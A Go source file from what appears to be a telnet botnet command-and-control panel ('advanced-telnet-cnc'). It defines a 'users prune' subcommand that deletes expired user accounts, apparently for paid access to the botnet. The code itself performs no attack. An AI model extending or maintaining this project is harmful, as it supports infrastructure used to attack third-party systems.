package subcommands

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"time"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"prune"},
		Arguments: nil,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			users, err := database.Users()
			if err != nil {
				return session.CmdError(err)
			}

			var deleted = 0
			for _, user := range users {
				if time.Now().After(user.Expiry) {
					if err := user.Remove(); err != nil {
						return session.CmdError(err)
					}
					deleted++
				}
			}

			return session.Println(config.Green, "Successfully pruned ", deleted, " users.")
		},
	})
}
